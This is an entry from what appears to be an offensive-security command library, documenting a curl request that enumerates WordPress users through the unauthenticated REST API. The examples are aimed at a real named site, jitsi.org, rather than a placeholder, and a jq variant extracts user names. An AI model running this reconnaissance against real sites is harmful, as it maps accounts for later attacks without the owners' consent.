---
id: cmd-curl-wp-users-001
data: 'curl -s https://jitsi.org/wp-json/wp/v2/users'
tags:
  - recon
  - enumeration
  - api
type: command
output: JSON array of user objects if successful
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:11.043Z'
verified: false
validated: true
submitted: true
---
# curl-wordpress-users-enum

## Command

```bash
curl -s https://jitsi.org/wp-json/wp/v2/users
```

## Description

This command uses curl to send a GET request to the WordPress REST API users endpoint, enumerating registered users without authentication. It is useful for reconnaissance on default or unhardened WordPress sites to disclose user information like names, slugs, and links.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses progress meter | Yes |
| `https://target/wp-json/wp/v2/users` | The API endpoint URL; replace 'target' with the site domain | Yes |

## Examples

### Basic Usage

```bash
curl -s https://jitsi.org/wp-json/wp/v2/users
```

### Advanced Usage

```bash
curl -s https://jitsi.org/wp-json/wp/v2/users | jq '.[].name'
```

## Expected Output

A JSON array containing user details, such as:

[
  {
    "id": 1,
    "name": "admin",
    "url": "",
    "description": "",
    "link": "https://jitsi.org/author/admin/",
    "slug": "admin",
    "avatar_urls": {
      "24": "https://secure.gravatar.com/avatar/...",
      "48": "https://secure.gravatar.com/avatar/...",
      "96": "https://secure.gravatar.com/avatar/..."
    },
    "meta": [],
    "_links": {
      "self": [{"href": "https://jitsi.org/wp-json/wp/v2/users/1"}],
      "collection": [{"href": "https://jitsi.org/wp-json/wp/v2/users"}]
    }
  }
]

If the endpoint is protected, expect an empty array [] or an error like {"code":"rest_cannot_read","message":"Sorry, you are not allowed to list users."}.

## Related

- [[Related Procedure|procedures/User-Enumeration-via-WordPress-REST-API]]
